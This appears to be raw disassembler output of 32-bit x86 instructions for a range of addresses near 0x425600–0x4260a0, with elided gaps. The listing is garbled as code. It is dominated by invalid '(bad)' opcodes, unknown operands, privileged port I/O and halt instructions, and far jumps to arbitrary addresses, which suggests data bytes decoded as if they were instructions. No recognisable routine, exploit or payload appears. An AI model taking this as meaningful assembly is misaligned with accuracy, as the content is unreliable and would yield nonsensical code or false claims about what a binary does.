  42562b:	lods   al,BYTE PTR ds:[esi]
  42562c:	pop    ss
  42562d:	into   
  42562e:	jns    0x42568f
  425630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425631:	addr16 (bad) 
  425633:	clc    
  425634:	xchg   esp,eax
  425635:	clc    
  425636:	add    bh,BYTE PTR [ebx+eax*4-0x7c1c3478]
  42563d:	and    cl,BYTE PTR [esi]
  42563f:	adc    eax,0x7d8990f6
  425644:	ins    DWORD PTR es:[edi],dx
  425645:	xchg   ebp,eax
  425646:	in     eax,0xb3
  425648:	mov    ds:0x7f2c835b,eax
  42564d:	repz pop es
  42564f:	mov    dl,0x46
  425651:	in     al,dx
  425652:	mov    edi,0xdca6315f
  425657:	push   ecx
  425658:	mov    edi,DWORD PTR [eax+0x14]
  42565b:	shr    BYTE PTR [ecx-0x6b805218],1
  425661:	add    eax,0x4087ebd8
  425666:	in     eax,dx
  425667:	(bad)  
  425668:	xchg   ebx,eax
  425669:	adc    ecx,DWORD PTR [ecx]
  42566b:	dec    esi
  42566c:	out    dx,eax
  42566d:	push   ebp
  42566e:	or     eax,0x8eb4e1fb
  425673:	mov    ds:0x67695adb,al
  425678:	ds sbb edi,ebp
  42567b:	push   ebx
  42567c:	cmp    al,0x38
  42567e:	push   edi
  42567f:	dec    ebx
  425680:	daa    
  425681:	jae    0x425609
  425683:	es xor eax,0x2653053
  425689:	and    DWORD PTR [eax],esi
  42568b:	ins    DWORD PTR es:[edi],dx
  42568c:	xadd   DWORD PTR ds:0x9213d151,esi
  425693:	mov    ch,0x75
  425695:	pop    ebx
  425696:	or     DWORD PTR [ebx+0x7d],ebx
  425699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42569a:	push   eax
  42569b:	aad    0x75
  42569d:	xor    DWORD PTR [esi-0x17],0x79
  4256a1:	mov    BYTE PTR [eax-0x6457eab5],dh
  4256a7:	sbb    dl,bh
  4256a9:	mov    dl,0x95
  4256ab:	push   edx
  4256ac:	xor    eax,0xd6c04f97
  4256b1:	shl    ecx,0x6c
  4256b4:	loop   0x42569b
  4256b6:	popa   
  4256b7:	sahf   
  4256b8:	icebp  
  4256b9:	xchg   edi,eax
  4256ba:	cdq    
  4256bb:	neg    ch
  4256bd:	lea    ebp,[eax-0x7893ed20]
  4256c3:	push   edx
  4256c4:	pop    eax
  4256c5:	mov    edi,0x6e98012b
  4256ca:	and    eax,DWORD PTR [ecx-0x213f2f68]
  4256d0:	arpl   WORD PTR [edi+0x1e8dac53],sp
  4256d6:	or     eax,0x5ac2790e
  4256db:	mov    WORD PTR [ebx+0x67407fbf],?
  4256e1:	mov    ch,0x63
  4256e3:	lock jne 0x4256df
  4256e6:	les    ebp,FWORD PTR [edi-0xe]
  4256e9:	sahf   
  4256ea:	mov    ebx,0x7c22d930
  4256ef:	or     eax,0xc3bcf273
  4256f4:	fadd   DWORD PTR [eax-0x11]
  4256f7:	aam    0xff
  4256f9:	in     eax,dx
  4256fa:	push   ebx
  4256fb:	sti    
  4256fc:	xlat   BYTE PTR ds:[ebx]
  4256fd:	pop    ebx
  4256fe:	xor    dh,BYTE PTR [edi]
  425700:	adc    dh,BYTE PTR [edx]
  425702:	push   ss
  425703:	xchg   ebx,eax
  425704:	mov    ds:0x6b060c28,eax
  425709:	cwde   
  42570a:	pop    ds
  42570b:	out    dx,eax
  42570c:	push   ax
  42570e:	out    dx,al
  42570f:	loope  0x425711
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x7f345d74
  425783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425784:	enter  0x18f,0x0
  425788:	add    al,0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	pusha  
  42578d:	mov    WORD PTR [edx],ss
  42578f:	(bad)  
  425790:	sbb    DWORD PTR [ecx],ebx
  425792:	mov    al,dl
  425794:	dec    esi
  425795:	(bad)  
  425796:	mov    ch,0x7a
  425798:	sbb    al,0x11
  42579a:	push   esp
  42579b:	sar    DWORD PTR [edi-0x37b8c1a1],1
  4257a1:	mov    ds:0x6876ac0d,al
  4257a6:	mov    dh,0xf2
  4257a8:	push   ecx
  4257a9:	push   eax
  4257aa:	mov    edi,0xbb3e167e
  4257af:	in     eax,dx
  4257b0:	mov    bl,0xf0
  4257b2:	add    BYTE PTR [edx-0x542d3a2a],0x87
  4257b9:	mov    eax,0x3fdc72e0
  4257be:	popa   
  4257bf:	sub    esi,DWORD PTR ds:0x759d1517
  4257c5:	jbe    0x4257b0
  4257c7:	xor    al,0xeb
  4257c9:	mov    ecx,0x5554fbd7
  4257ce:	or     dl,BYTE PTR [ecx-0x7]
  4257d1:	aaa    
  4257d2:	or     DWORD PTR [esi-0x35],esp
  4257d5:	jmp    0x2ad0:0x4e438fcb
  4257dc:	retf   0x288a
  4257df:	inc    ebx
  4257e0:	call   0xaf26:0xf7722932
  4257e7:	aas    
  4257e8:	test   DWORD PTR ds:0xefd33b5f,0x3599dd89
  4257f2:	scas   al,BYTE PTR es:[edi]
  4257f3:	scas   al,BYTE PTR es:[edi]
  4257f4:	call   0xc4391ec7
  4257f9:	int3   
  4257fa:	fdiv   DWORD PTR [ebx-0x2c]
  4257fd:	jbe    0x425791
  4257ff:	xchg   edi,eax
  425800:	pop    edx
  425801:	dec    ebx
  425802:	and    al,0x4f
  425804:	pop    edi
  425805:	fwait
  425806:	aam    0xf8
  425808:	stc    
  425809:	or     edi,DWORD PTR [ebx-0x6fe45273]
  42580f:	aam    0x3d
  425811:	mov    ds:0x8908ff0d,al
  425816:	into   
  425817:	pop    esp
  425818:	iret   
  425819:	jp     0x42581f
  42581b:	inc    DWORD PTR ds:0x9d299b25
  425821:	dec    ebp
  425822:	sub    al,0x3f
  425824:	hlt    
  425825:	out    dx,al
  425826:	fist   DWORD PTR [ebx+ebp*8-0x67]
  42582a:	gs dec eax
  42582c:	int3   
  42582d:	gs mov edx,0xe1a86cf4
  425833:	arpl   WORD PTR [esi-0x21],bp
  425836:	mov    edi,DWORD PTR [ecx+0x38]
  425839:	xor    eax,0x7b8a7cd9
  42583e:	es in  eax,dx
  425840:	in     eax,0x4d
  425842:	pushf  
  425843:	lods   al,BYTE PTR ds:[esi]
  425844:	sub    eax,0x309ea459
  425849:	cmp    eax,0xf15739ab
  42584e:	(bad)  
  42584f:	and    edi,edi
  425851:	aad    0x7b
  425853:	jo     0x425896
  425855:	mov    eax,ds:0xc94ebccf
  42585a:	xchg   ecx,eax
  42585b:	(bad)  
  42585e:	(bad)  
  42585f:	repz out dx,eax
  425861:	scas   eax,DWORD PTR es:[edi]
  425862:	jae    0x4258b8
  425864:	jecxz  0x42589b
  425866:	aaa    
  425867:	out    dx,eax
  425868:	jae    0x4258c5
  42586a:	int3   
  42586b:	jg     0x4258e9
  42586d:	out    0x10,eax
  42586f:	popa   
  425870:	test   BYTE PTR [ebx+0x40e8b40c],0x88
  425877:	xor    bl,ch
  425879:	pusha  
  42587a:	fwait
  42587b:	pop    es
  42587c:	adc    BYTE PTR [eax+0x7c35541e],al
  425882:	cld    
  425883:	cmp    al,0xe3
  425885:	and    BYTE PTR [ebx-0x4b8b936c],dl
  42588b:	xchg   edx,eax
  42588c:	add    BYTE PTR [edi],dh
  42588e:	inc    esi
  42588f:	add    BYTE PTR ds:[eax],al
	...
  4258f2:	add    BYTE PTR [eax],al
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	or     DWORD PTR [esi+0x51],edx
  425903:	add    esp,ecx
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	xchg   BYTE PTR [ecx-0x78],cl
  42590f:	xchg   esi,eax
  425910:	ss jecxz 0x4258e0
  425913:	jae    0x42594b
  425915:	mov    ?,WORD PTR [ecx]
  425917:	outs   dx,DWORD PTR ds:[esi]
  425918:	nop
  425919:	jmp    0xcce9:0x2ea0a53a
  425920:	fwait
  425921:	jge    0x4258e6
  425923:	mov    edi,DWORD PTR [eax]
  425925:	mov    cs,WORD PTR [edi]
  425927:	dec    edi
  425928:	xchg   ebp,eax
  425929:	hlt    
  42592a:	xor    BYTE PTR [esi-0x53],0xe5
  42592e:	cmp    bl,BYTE PTR [ecx-0xf7e7cbb]
  425934:	mov    ch,ch
  425936:	adc    bl,cl
  425938:	mov    ch,0xd5
  42593a:	cli    
  42593b:	or     al,0x55
  42593d:	pop    ebp
  42593e:	xchg   edx,eax
  42593f:	jmp    0x425981
  425941:	fsubr  QWORD PTR [edx]
  425943:	add    eax,0x1b964f
  425948:	lods   eax,DWORD PTR ds:[esi]
  425949:	je     0x42592c
  42594b:	mov    ebx,0xee393bdb
  425950:	fwait
  425951:	lock sub edx,ecx
  425954:	test   dh,al
  425956:	mov    DWORD PTR ds:0xb08dccbf,esp
  42595c:	div    BYTE PTR [ecx+0x729afae4]
  425962:	or     DWORD PTR [ebx+eiz*8+0x22d440e9],esi
  425969:	fmul   st,st(5)
  42596b:	pusha  
  42596c:	add    al,0xd1
  42596e:	inc    eax
  42596f:	jmp    0xff2e19a
  425974:	ret    
  425975:	add    ch,BYTE PTR ds:0x646fd41c
  42597b:	ja     0x425966
  42597d:	and    BYTE PTR [edx+0x5217133e],0xc
  425984:	cmp    BYTE PTR [ecx+0x1d],bl
  425987:	dec    ebx
  425988:	fadd   st(7),st
  42598a:	fs loopne 0x425943
  42598d:	xlat   BYTE PTR ds:[ebx]
  42598e:	cs fwait
  425990:	mov    ds:0x614e1bdb,al
  425995:	ds aam 0x9f
  425998:	mov    ch,BYTE PTR [ebx-0x53]
  42599b:	fcmovu st,st(5)
  42599d:	push   ebp
  42599e:	pop    DWORD PTR [edi-0x280384e5]
  4259a4:	repnz inc eax
  4259a6:	fcmovnbe st,st(3)
  4259a8:	push   ss
  4259a9:	lock jge 0x4259b4
  4259ac:	mov    ah,0x72
  4259ae:	iret   
  4259af:	mov    edx,0x6cf20762
  4259b4:	gs push ds
  4259b6:	jl     0x425a0d
  4259b8:	test   al,0x60
  4259ba:	imul   esi,DWORD PTR [edi+0x70],0x222127b
  4259c1:	int    0x16
  4259c3:	ret    
  4259c4:	pop    edi
  4259c5:	les    ebx,FWORD PTR [eax-0x7e]
  4259c8:	jmp    0x7c7a4bc5
  4259cd:	loop   0x4259b6
  4259cf:	test   DWORD PTR [eax+0x3229aa66],edi
  4259d5:	adc    eax,0xe66c4e93
  4259da:	shl    al,0x2b
  4259dd:	sbb    DWORD PTR [esi+0x3fced4ed],edi
  4259e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259e4:	mov    dl,0x81
  4259e6:	fild   QWORD PTR [eax+0x4367479d]
  4259ec:	xchg   DWORD PTR [edx-0x7e2e819c],ebp
  4259f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259f3:	xchg   al,bh
  4259f5:	xor    dh,BYTE PTR [edi]
  4259f7:	jmp    0x7eacb3a7
  4259fc:	(bad)  
  4259fd:	fnstenv [edi]
  4259ff:	cmp    DWORD PTR [esi+esi*1-0x6e],ebx
  425a03:	mov    ah,0xee
  425a05:	lds    esp,FWORD PTR [eax+eax*4+0x47c9cab4]
  425a0c:	sbb    eax,0x4f1414
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x55c0523e]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	imul   eax,DWORD PTR [ebp+edx*4+0x1f920d3f],0x88b07c34
  425a97:	jp     0x425a89
  425a99:	hlt    
  425a9a:	hlt    
  425a9b:	pop    ebx
  425a9c:	jae    0x425acd
  425a9e:	lods   al,BYTE PTR ds:[esi]
  425a9f:	ins    DWORD PTR es:[edi],dx
  425aa0:	push   esp
  425aa1:	xchg   DWORD PTR [esi+0x44],edi
  425aa4:	push   esi
  425aa5:	pusha  
  425aa6:	sbb    dh,0xd0
  425aa9:	mov    WORD PTR [ecx+ecx*4],ds
  425aac:	and    bh,0x6
  425aaf:	popa   
  425ab0:	out    dx,al
  425ab1:	imul   ebx,DWORD PTR [edi-0x24],0xef3be2d5
  425ab8:	je     0x425a6e
  425aba:	out    0xd4,al
  425abc:	rcl    DWORD PTR [edx],0x45
  425abf:	mov    esi,0xfb931b9c
  425ac4:	sbb    eax,0x77d7093
  425ac9:	mov    al,0xe5
  425acb:	push   esp
  425acc:	repz repz mov dl,0xa7
  425ad0:	scas   al,BYTE PTR es:[edi]
  425ad1:	mov    BYTE PTR [esi],al
  425ad3:	sub    edx,DWORD PTR [eax-0x2b]
  425ad6:	in     al,0x6b
  425ad8:	in     eax,0x56
  425ada:	pushf  
  425adb:	in     al,0xf5
  425add:	add    al,0xc8
  425adf:	in     eax,0xd9
  425ae1:	retf   
  425ae2:	out    dx,al
  425ae3:	fs or  ebx,DWORD PTR ds:[esi]
  425ae7:	or     bl,BYTE PTR [eax]
  425ae9:	jmp    0x425a84
  425aeb:	hlt    
  425aec:	push   ecx
  425aed:	arpl   WORD PTR [ebx+0x4c9ea343],dx
  425af3:	mov    esp,0xb9c1101d
  425af9:	jge    0x425ab8
  425afb:	mov    ch,0x21
  425afd:	cld    
  425afe:	out    0x8,eax
  425b00:	das    
  425b01:	fidivr DWORD PTR [ebx]
  425b03:	ret    
  425b04:	test   DWORD PTR [esi+0x6e],ecx
  425b07:	push   esi
  425b08:	add    edx,edi
  425b0a:	sti    
  425b0b:	rcl    DWORD PTR [esi+0x23b89ef1],0xb
  425b12:	adc    eax,0xf9c7d2da
  425b17:	call   0xeba8:0xf36ea3bc
  425b1e:	jg     0x425b09
  425b20:	mov    ds:0x510b00ed,eax
  425b25:	mov    dh,0xca
  425b27:	pop    ebx
  425b28:	push   ebp
  425b29:	pop    esi
  425b2a:	aaa    
  425b2b:	sbb    dl,ch
  425b2d:	mov    DWORD PTR [ebp+0x3a],edx
  425b30:	adc    BYTE PTR [edi+ecx*1+0x58374c08],cl
  425b37:	jle    0x425b2e
  425b39:	test   eax,0x733d85
  425b3e:	push   esi
  425b3f:	pop    ds
  425b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b41:	pop    ebp
  425b42:	xchg   ebp,eax
  425b43:	or     bl,BYTE PTR [esi-0x4f]
  425b46:	push   esp
  425b47:	fisubr DWORD PTR [esi]
  425b49:	push   es
  425b4a:	retf   
  425b4b:	jmp    0x425b58
  425b4d:	int    0x20
  425b4f:	fist   WORD PTR [ebx+ebx*2]
  425b52:	mov    edx,0x67811f19
  425b57:	push   eax
  425b58:	xor    BYTE PTR [esi+0x20],0x4a
  425b5c:	and    al,0x5
  425b5e:	mov    ds:0x672dc82c,al
  425b63:	and    ecx,DWORD PTR [ecx+0x3125ef21]
  425b69:	mov    edi,0x2b0e1db0
  425b6e:	daa    
  425b6f:	inc    ebp
  425b70:	sub    al,0x6f
  425b72:	inc    eax
  425b73:	add    cl,al
  425b75:	mov    edx,0x7a1426b4
  425b7a:	ss dec ebp
  425b7c:	enter  0x7d0d,0x2f
  425b80:	shr    DWORD PTR [edx],cl
  425b82:	dec    esp
  425b83:	push   esp
  425b84:	pushf  
  425b85:	xor    DWORD PTR [ebp+0x3294ba8d],ecx
  425b8b:	xchg   ah,al
  425b8d:	popf   
  425b8e:	daa    
  425b8f:	pop    ecx
	...
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	pop    ecx
  425c01:	lea    ebx,[eax+0x192d496]
  425c07:	add    BYTE PTR [ecx+eax*1],al
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	adc    eax,0xffce598c
  425c11:	mov    edi,0x9a6e5dde
  425c16:	icebp  
  425c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c18:	xchg   edx,eax
  425c19:	rcr    bh,0x82
  425c1c:	scas   al,BYTE PTR es:[edi]
  425c1d:	and    DWORD PTR [edx-0x311f43be],ebx
  425c23:	mov    al,ds:0x6344e7ab
  425c28:	inc    ebp
  425c29:	adc    eax,0xa2f4e898
  425c2e:	xchg   esp,eax
  425c2f:	cmp    DWORD PTR [esi+0x6eee2bab],ebx
  425c35:	xchg   ebp,eax
  425c36:	cmp    DWORD PTR [eax+ebx*4-0x7fc52a74],ebx
  425c3d:	int3   
  425c3e:	dec    esp
  425c3f:	hlt    
  425c40:	test   DWORD PTR [eax],edx
  425c42:	arpl   WORD PTR [esi+0x6223ffa0],dx
  425c48:	call   0xd986b885
  425c4d:	push   edx
  425c4e:	xchg   BYTE PTR [esi],ah
  425c50:	jl     0x425ca5
  425c52:	cdq    
  425c53:	pop    ebp
  425c54:	push   ds
  425c55:	fst    QWORD PTR [edi]
  425c57:	sbb    al,BYTE PTR [ecx-0x61f7270]
  425c5d:	xor    edi,DWORD PTR [eax-0xf]
  425c60:	(bad)  
  425c61:	dec    edx
  425c62:	outs   dx,BYTE PTR ds:[esi]
  425c63:	repnz or al,0xcd
  425c66:	(bad)  
  425c67:	(bad)  
  425c69:	pop    es
  425c6a:	hlt    
  425c6b:	dec    edi
  425c6c:	das    
  425c6d:	jmp    0x9a811f80
  425c72:	sub    al,0x80
  425c74:	adc    al,0x54
  425c76:	xchg   esp,eax
  425c77:	jne    0x425cf2
  425c79:	jne    0x425cca
  425c7b:	dec    esi
  425c7c:	xor    ebx,edx
  425c7e:	xor    esp,DWORD PTR [eax+0x365bfd5c]
  425c84:	sub    BYTE PTR [edx-0x28c00665],dl
  425c8a:	repnz pop esi
  425c8c:	push   cs
  425c8d:	call   FWORD PTR [ecx+0x60]
  425c90:	popa   
  425c91:	mov    ah,0x12
  425c93:	std    
  425c94:	aam    0x6f
  425c96:	sub    eax,DWORD PTR [eax-0x3a]
  425c99:	pusha  
  425c9a:	es jbe 0x425c2d
  425c9d:	dec    esp
  425c9e:	retf   0x3427
  425ca1:	cli    
  425ca2:	ja     0x425c5f
  425ca4:	mov    esi,0xa79ce6d2
  425ca9:	or     BYTE PTR [edx],0xc6
  425cac:	outs   dx,BYTE PTR ds:[esi]
  425cad:	xor    edi,DWORD PTR [eax-0x62]
  425cb0:	adc    dl,cl
  425cb2:	adc    al,0x43
  425cb4:	sbb    eax,0xf84213d2
  425cb9:	scas   eax,DWORD PTR es:[edi]
  425cba:	ret    0x9217
  425cbd:	xor    DWORD PTR [ebp+ecx*1+0x6704b77e],edx
  425cc4:	clc    
  425cc5:	fdiv   DWORD PTR [edi]
  425cc7:	inc    esp
  425cc8:	pop    ebp
  425cc9:	inc    ebp
  425cca:	lds    esi,FWORD PTR [ecx]
  425ccc:	addr16 jne 0x425d3c
  425ccf:	xchg   ecx,eax
  425cd0:	jge    0x425cd8
  425cd2:	rcr    DWORD PTR [edx-0x12],1
  425cd5:	pop    ebx
  425cd6:	retf   0x4ca0
  425cd9:	jecxz  0x425d09
  425cdb:	push   0xffffff9f
  425cdd:	cwde   
  425cde:	(bad)  
  425cdf:	cwde   
  425ce0:	enter  0x9545,0xf1
  425ce4:	imul   eax,DWORD PTR [eax+0x234f6c54],0x28c57c4d
  425cee:	push   ebx
  425cef:	nop
  425cf0:	inc    esi
  425cf1:	cli    
  425cf2:	jb     0x425d17
  425cf4:	inc    edi
  425cf5:	jno    0x425d50
  425cf7:	ror    BYTE PTR [esi+ebx*1],0x7c
  425cfb:	ss call 0x3a1e0a38
  425d01:	mov    ecx,0x9e86966d
  425d06:	pop    edx
  425d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d08:	pop    ebx
  425d09:	test   ebx,eax
  425d0b:	fisub  WORD PTR [esi+esi*8-0x6c]
  425d0f:	dec    ebx
	...
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x2fd31e59,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	and    eax,0x21017371
  425d91:	pushf  
  425d92:	fcomp  QWORD PTR [edi+0x5f525700]
  425d98:	(bad)  
  425d99:	test   BYTE PTR [eax],0x70
  425d9c:	out    0xe2,eax
  425d9e:	cmp    DWORD PTR [ecx],eax
  425da0:	mov    ebx,0x1323b06e
  425da5:	test   eax,0x4496762f
  425daa:	pusha  
  425dab:	(bad)  
  425dac:	fsub   DWORD PTR [edx+0x78b36300]
  425db2:	push   eax
  425db3:	loop   0x425de9
  425db5:	repz mov ss,WORD PTR [edx]
  425db8:	push   0x9a343b4b
  425dbd:	xchg   edi,esp
  425dbf:	mov    ch,0x3d
  425dc1:	sub    eax,0x51aea14a
  425dc6:	daa    
  425dc7:	in     al,dx
  425dc8:	fdiv   QWORD PTR [eax+0x7b]
  425dcb:	test   DWORD PTR [ebp-0x5e46144e],ecx
  425dd1:	cmp    BYTE PTR [ecx+0x3c],ah
  425dd4:	rcl    DWORD PTR [esi-0x4e],1
  425dd7:	lahf   
  425dd8:	and    al,0xfa
  425dda:	daa    
  425ddb:	xchg   edi,eax
  425ddc:	adc    eax,0x674343ff
  425de1:	pop    es
  425de2:	les    esi,FWORD PTR [edx+0xf]
  425de5:	sbb    BYTE PTR [edi-0x68],bh
  425de8:	sbb    al,dh
  425dea:	sbb    al,0x2c
  425dec:	mov    bh,0x8b
  425dee:	adc    eax,DWORD PTR [esi-0x3a]
  425df1:	ret    
  425df2:	lods   eax,DWORD PTR ds:[esi]
  425df3:	test   eax,0xcccd9177
  425df8:	gs mov esi,edi
  425dfb:	mov    WORD PTR [edx],cs
  425dfd:	inc    ecx
  425dfe:	jge    0x425e67
  425e00:	dec    esp
  425e01:	push   ebp
  425e02:	icebp  
  425e03:	fsub   DWORD PTR [ebx]
  425e05:	pop    esi
  425e06:	pop    esi
  425e07:	repnz imul ebx,DWORD PTR [edx],0xa1e79fcb
  425e0e:	loope  0x425e42
  425e10:	call   0x3c58:0x810c6d2a
  425e17:	pop    esp
  425e18:	dec    esp
  425e19:	int3   
  425e1a:	call   0xde12:0x63f0dbaf
  425e21:	es mov ch,0x21
  425e24:	ffree  st(7)
  425e26:	jb     0x425e53
  425e28:	(bad)  
  425e29:	jmp    0x425de5
  425e2b:	ins    DWORD PTR es:[edi],dx
  425e2c:	jmp    0x425e78
  425e2e:	popa   
  425e2f:	mov    dl,0x6
  425e31:	adc    BYTE PTR [ebp+0x1d865344],dl
  425e37:	xchg   esi,eax
  425e38:	pop    ebx
  425e39:	xchg   BYTE PTR [esp+edi*2-0x29],cl
  425e3d:	xchg   esi,eax
  425e3e:	in     eax,0x5b
  425e40:	sar    DWORD PTR fs:[eax],0x6c
  425e44:	ds mov bh,0xfe
  425e47:	pop    esi
  425e48:	sub    DWORD PTR [edi],eax
  425e4a:	aad    0xcb
  425e4c:	mov    ah,0xa9
  425e4e:	jo     0x425eb5
  425e50:	pop    ecx
  425e51:	mov    ?,WORD PTR [edi+edi*4+0x46]
  425e55:	adc    BYTE PTR [esi-0x4c],bl
  425e58:	pop    ecx
  425e59:	call   0xc5460a19
  425e5e:	sbb    ebp,ebx
  425e60:	cli    
  425e61:	mov    WORD PTR [ebp-0x6786dfa5],gs
  425e67:	in     al,dx
  425e68:	fidiv  WORD PTR [ecx-0x4ab5292]
  425e6e:	hlt    
  425e6f:	imul   ebx,DWORD PTR [ebx],0x6a
  425e72:	sti    
  425e73:	out    0x61,al
  425e75:	jnp    0x425e64
  425e77:	aas    
  425e78:	aam    0x25
  425e7a:	and    bh,bh
  425e7c:	nop
  425e7d:	repnz pushf 
  425e7f:	fwait
  425e80:	ss or  eax,0xe79b7db7
  425e86:	out    0xfe,eax
  425e88:	mov    ds:0x8351038e,eax
  425e8d:	or     BYTE PTR [edi+0xe9],bl
	...
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	xchg   edx,eax
  425f01:	jns    0x425f59
  425f03:	sbb    ebx,esp
  425f05:	xchg   esp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    al,0x1
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	sbb    eax,0x7ebaf6bd
  425f11:	xlat   BYTE PTR ds:[ebx]
  425f12:	dec    esi
  425f13:	fwait
  425f14:	int    0xa3
  425f16:	cmp    edx,DWORD PTR [ecx-0xceca50f]
  425f1c:	retf   
  425f1d:	imul   edx,DWORD PTR [esi-0x252fbdbe],0xfab242d1
  425f27:	(bad)  
  425f28:	cmp    al,0x55
  425f2a:	cs aas 
  425f2c:	dec    edi
  425f2d:	adc    bl,al
  425f2f:	cmp    al,0xcd
  425f31:	push   ss
  425f32:	ds push ds
  425f34:	lahf   
  425f35:	dec    esi
  425f36:	enter  0x7d14,0x7d
  425f3a:	sub    dl,BYTE PTR [ebx+0x1eb7e974]
  425f40:	inc    esi
  425f41:	clc    
  425f42:	adc    dh,cl
  425f44:	mov    ds:0x98a915e,eax
  425f49:	sar    BYTE PTR [edi+ecx*2+0x7c],cl
  425f4d:	mov    esi,0x5ea16201
  425f52:	fldcw  WORD PTR [eax+edi*8-0x13]
  425f56:	sbb    DWORD PTR [ebp+0x42],ebx
  425f59:	ds sub al,0x78
  425f5c:	mov    DWORD PTR [ebx+ebx*8+0x591f9e89],edx
  425f63:	(bad)  
  425f64:	pop    ebp
  425f65:	jb     0x425f78
  425f67:	mov    ebx,0xfb308859
  425f6c:	fadd   DWORD PTR [edi+ebp*4-0xe]
  425f70:	jmp    FWORD PTR [eax-0x2e]
  425f73:	div    DWORD PTR [esp+ebx*4]
  425f76:	sbb    eax,0x3930d5e8
  425f7b:	add    DWORD PTR [ebp+0x26],esi
  425f7e:	xchg   ecx,eax
  425f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f80:	(bad)
  425f84:	inc    esp
  425f85:	cwde   
  425f86:	dec    ebx
  425f87:	mov    edx,0x8c36949a
  425f8c:	or     eax,0x5fc5fc02
  425f91:	fadd   DWORD PTR [ecx+0x12523bde]
  425f97:	ss jg  0x425f4c
  425f9a:	push   eax
  425f9b:	jle    0x425fd2
  425f9d:	aam    0x53
  425f9f:	gs aad 0x24
  425fa2:	loope  0x425f8f
  425fa4:	out    dx,eax
  425fa5:	and    esp,esi
  425fa7:	mov    ebp,0x4e40d2cb
  425fac:	inc    ebp
  425fad:	mov    WORD PTR [edx],es
  425faf:	jp     0x425fd9
  425fb1:	mov    dl,ch
  425fb3:	mov    al,0xd0
  425fb5:	fild   WORD PTR [edx+0x617e4194]
  425fbb:	dec    ecx
  425fbc:	jge    0x425f5c
  425fbe:	xchg   esp,esi
  425fc0:	fcom   DWORD PTR [edi+0x6e]
  425fc3:	sbb    esp,edx
  425fc5:	scas   eax,DWORD PTR es:[edi]
  425fc6:	dec    edi
  425fc7:	leave  
  425fc8:	xor    bh,bh
  425fca:	icebp  
  425fcb:	clc    
  425fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fcd:	fbld   TBYTE PTR [ebx-0x36]
  425fd0:	out    0xbe,eax
  425fd2:	sahf   
  425fd3:	das    
  425fd4:	inc    eax
  425fd5:	jnp    0x426012
  425fd7:	jecxz  0x425fb9
  425fd9:	xor    esp,DWORD PTR [ebx]
  425fdb:	aam    0x93
  425fdd:	sti    
  425fde:	popf   
  425fdf:	pusha  
  425fe0:	push   cs
  425fe1:	and    eax,0xd0b5471f
  425fe6:	push   0x7a
  425fe8:	inc    esi
  425fe9:	push   0x1a712362
  425fee:	(bad)  
  425fef:	clc    
  425ff0:	test   DWORD PTR [edi-0x439bc0c0],eax
  425ff6:	and    al,0x8d
  425ff8:	xor    ebx,ecx
  425ffa:	aam    0x53
  425ffc:	mov    edx,DWORD PTR [edi]
  425ffe:	sub    ecx,DWORD PTR [edi+ecx*8]
  426001:	mov    esi,0x8305c273
  426006:	vsubps ymm3,ymm1,YMMWORD PTR [esi]
  42600a:	jb     0x42601d
  42600c:	addr16 jmp 0x426037
  42600f:	fadd   QWORD PTR [eax]
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	mov    eax,ds:0xe0ca15c0
  426085:	xchg   ebp,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	xor    ah,0x67
  42608f:	shr    edx,cl
  426091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426092:	cmp    dl,dh
  426094:	xor    al,0x9f
  426096:	adc    DWORD PTR [esi],ebp
  426098:	mov    bl,0x33
  42609a:	adc    BYTE PTR [edi],0x22
  42609d:	mov    ds:0xcac3ba52,eax
  4260a2:	sbb    dl,BYTE PTR [esi+0x6a]
